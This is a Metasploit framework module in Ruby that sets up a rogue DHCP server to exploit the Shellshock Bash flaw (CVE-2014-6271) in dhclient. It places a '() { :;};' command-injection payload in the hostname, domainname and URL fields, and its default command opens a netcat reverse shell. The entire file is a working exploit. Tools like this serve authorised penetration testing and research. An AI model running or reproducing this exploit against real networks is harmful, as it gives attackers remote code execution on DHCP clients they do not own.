##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::DHCPServer

  def initialize
    super(
      'Name' => 'DHCP Client Bash Environment Variable Code Injection (Shellshock)',
      'Description' => %q{
        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell
        handles external environment variables. This module targets dhclient by responding
        to DHCP requests with a malicious hostname, domainname, and URL which are then
        passed to the configuration scripts as environment variables, resulting in code
        execution.
      },
      'Author' => [
        'scriptjunkie', 'apconole[at]yahoo.com', # Original DHCP Server auxiliary module
        'Stephane Chazelas', # Vulnerability discovery
        'Ramon de C Valle' # This module
      ],
      'License' => MSF_LICENSE,
      'Actions' => [
        [ 'Service', { 'Description' => 'Run Shellshock DHCP server' } ]
      ],
      'PassiveActions' => [
        'Service'
      ],
      'DefaultAction' => 'Service',
      'References' => [
        [ 'CVE', '2014-6271' ],
        [ 'CWE', '94' ],
        [ 'OSVDB', '112004' ],
        [ 'EDB', '34765' ],
        [ 'URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/' ],
        [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ],
        [ 'URL', 'https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/' ]
      ],
      'DisclosureDate' => '2014-09-24',
      'Notes' => {
        'AKA' => ['Shellshock']
      }
    )

    register_options(
      [
        OptString.new('CMD', [ true, 'The command to run', '/bin/nc -e /bin/sh 127.0.0.1 4444'])
      ]
    )

    register_advanced_options(
      [
        OptString.new(
          'SHELLSHOCK_DHCP_VARS',
          [
            true,
            'DHCP variables to poison (comma-separated: domainname, hostname, url)',
            'domainname,hostname,url'
          ]
        )
      ]
    )

    deregister_options('DOMAINNAME', 'HOSTNAME', 'URL')
  end

  def dhcp_vars
    vars = datastore['SHELLSHOCK_DHCP_VARS'].to_s.split(',').map(&:strip)
    invalid = vars - %w[domainname hostname url]
    fail_with(Failure::BadConfig, "Invalid SHELLSHOCK_DHCP_VARS: #{invalid.join(', ')}") unless invalid.empty?
    vars
  end

  def build_dhcp_vars(value)
    vars = {}

    dhcp_vars.each do |var|
      vprint_status("Injecting into: DHCP #{var}")
      case var
      when 'domainname'
        vars['DOMAINNAME'] = value
      when 'hostname'
        vars['HOSTNAME'] = value
      when 'url'
        vars['URL'] = value
      end
    end

    vars
  end

  def run
    value = "() { :;};PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #{datastore['CMD']}"

    start_service(
      datastore.merge(build_dhcp_vars(value))
    )

    # Wait for finish
    sleep 2 while @dhcp&.thread&.alive?

    stop_service
  end
end
